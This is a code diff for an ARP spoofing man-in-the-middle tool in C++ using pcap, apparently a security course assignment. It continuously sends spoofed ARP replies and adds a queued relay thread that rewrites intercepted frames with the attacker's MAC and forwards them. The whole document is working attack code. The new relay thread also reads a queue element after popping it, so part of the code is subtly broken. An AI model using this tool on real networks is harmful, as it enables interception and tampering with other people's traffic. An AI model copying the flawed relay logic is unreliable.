@@ -4,8 +4,11 @@
 #include <cstring>
 #include <map>
 #include <thread>
-#include <chrono>
 #include <set>
+#include <mutex>
+#include <queue>
+#include <condition_variable>
+#include <unistd.h>
 
 #include "ethhdr.h"
 #include "arphdr.h"
@@ -33,6 +36,10 @@ map<Ip, Mac> TargetNet;
 map<Ip, Ip> IpNet;
 map<Mac, Mac> MacNet;
 set<Mac> senderMacSet;
+
+static mutex mu;
+queue<EthArpPacket> packetQueue;
+condition_variable queueCV;
 
 pcap_t* handle;
 pcap_t* relayhandle;
@@ -78,7 +85,7 @@ int main(int argc, char* argv[]) {
 	// make flow each (Sender, Target) pair
 	for (int i = 2; i < argc; i += 2) {
 		// Sender
-		Ip senderIp = Ip(argv[i]);      
+		Ip senderIp = Ip(argv[i]); 
 		Mac senderMac;
 		// Target
 		Ip targetIp = Ip(argv[i + 1]);
@@ -108,7 +115,9 @@ int main(int argc, char* argv[]) {
 
 		// sender-target Ip / Mac pair
 		IpNet.insert(make_pair(senderIp, targetIp));
-		MacNet.insert(make_pair(senderMac, targetMac));
+		MacNet.insert(make_pair(SenderNet[senderIp], TargetNet[targetIp]));
+
+		cout<<static_cast<string>(SenderNet[senderIp])<<" "<<static_cast<string>(TargetNet[targetIp])<<endl;
 
 		// Mac Set
 		senderMacSet.insert(senderMac);
@@ -270,7 +279,30 @@ void arp_spoofing_thread(Mac senderMac, Ip senderIp, Ip targetIp) {
 
 	while (true) {
 		send_arp_spoof(senderMac, senderIp, targetIp);
-		this_thread::sleep_for(chrono::seconds(1)); // Wait for 1 second
+		sleep(1); //1초
+	}
+}
+
+void relay_send_thread(){
+	while(true){
+		unique_lock<mutex> lock(mu);
+		queueCV.wait(lock);
+		while(!packetQueue.empty()){
+			EthArpPacket* eth_relay = &packetQueue.front();
+			packetQueue.pop();
+			// unique_lock<mutex> unlock(mu);
+
+			if (eth_relay->eth_.type() != EthHdr::Arp && MacNet.find(eth_relay->eth_.smac()) != MacNet.end()) {				
+				EthArpPacket relay_copy;
+				memcpy(&relay_copy, eth_relay, sizeof(EthArpPacket));
+
+				relay_copy.eth_.smac_ = attackerMac;
+				relay_copy.eth_.dmac_ = MacNet[eth_relay->eth_.smac()]; //targetMac
+
+				pcap_sendpacket(relayhandle, reinterpret_cast<const u_char*>(&relay_copy), sizeof(EthArpPacket));
+				// cout<<"send relay"<<endl;
+			}
+		}
 	}
 }
 
@@ -279,22 +311,16 @@ void relay_thread() {
     const u_char* relaypacket;
     struct pcap_pkthdr* header;
 
+	thread relaySendThread(relay_send_thread);
+	relaySendThread.detach();	
+
     while (1) {
         int res = pcap_next_ex(relayhandle, &header, &relaypacket);
+
         const EthArpPacket* eth_relay = reinterpret_cast<const EthArpPacket*>(relaypacket);
 		
-
-        if (eth_relay->eth_.type() != EthHdr::Arp && !eth_relay->eth_.dmac().isBroadcast() && senderMacSet.find(eth_relay->eth_.smac()) != senderMacSet.end()) {
-            EthArpPacket relay_copy;
-            memcpy(&relay_copy, eth_relay, sizeof(EthArpPacket));
-			Mac smac = relay_copy.eth_.smac_;
-            relay_copy.eth_.smac_ = attackerMac;
-			relay_copy.eth_.dmac_ = MacNet[smac]; //targetMac
-
-			printf("create relay for %s \n", 
-				static_cast<string>(relay_copy.arp_.sip()).c_str());
-			// cout<<static_cast<string>(relay_copy.arp_.sip())<<endl;
-            pcap_sendpacket(relayhandle, reinterpret_cast<const u_char*>(&relay_copy), sizeof(EthArpPacket));
-        }
+		unique_lock<mutex> lock(mu);
+		packetQueue.push(*eth_relay);
+		queueCV.notify_one();
     }
 }
